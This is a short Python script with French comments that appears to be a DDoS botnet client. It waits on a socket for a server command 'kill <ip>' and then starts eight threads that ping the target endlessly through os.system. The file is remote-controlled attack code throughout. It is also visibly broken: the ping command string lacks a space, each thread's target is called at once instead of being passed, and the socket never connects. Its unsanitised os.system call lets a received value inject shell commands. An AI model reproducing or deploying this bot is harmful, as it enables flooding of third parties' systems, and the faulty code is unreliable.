import socket
import threading
import os
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def Thread_DDOS(ip):  # ping a l'infini
    while True:
        os.system("ping" + ip)


# fonction qui recoit en continu du texte de la part du serveur
def thread_recevoir(client_socket):
    while True:
        response = client.recv(1024)
        print(response)
        kill = response.split()
        if kill[0] == "kill":  # si le serveur entre la commande "kill" avec un ip qui suit 8 threads vont commencer a pinger
            thread_kill = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill.start()
            thread_kill2 = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill2.start()
            thread_kill3 = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill3.start()
            thread_kill4 = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill4.start()
            thread_kill5 = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill5.start()
            thread_kill6 = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill6.start()
            thread_kill7 = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill7.start()
            thread_kill8 = threading.Thread(target=Thread_DDOS(kill[1]))
            thread_kill8.start()


